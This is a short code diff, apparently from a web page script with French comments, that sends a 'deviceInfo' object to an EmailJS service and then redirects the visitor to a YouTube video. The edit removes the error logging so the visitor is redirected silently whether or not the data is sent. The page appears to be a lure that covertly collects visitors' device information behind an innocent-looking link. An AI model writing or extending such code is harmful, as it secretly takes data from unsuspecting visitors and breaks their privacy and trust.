@@ -38,10 +38,10 @@
       emailjs.send("service_rdyzfdq", "template_y89zhnk", deviceInfo)
         .then(() => {
           // Redirection après envoi
-          window.location.href = "https://www.youtube.com/watch?v=NB7WuqWzDhw"; // change vers ton lien
+          window.location.href = "https://www.youtube.com/watch?v=NB7WuqWzDhw";
         })
         .catch((error) => {
-          console.error("Erreur lors de l’envoi :", error);
+          window.location.href = "https://www.youtube.com/watch?v=NB7WuqWzDhw";
         });
     }
 
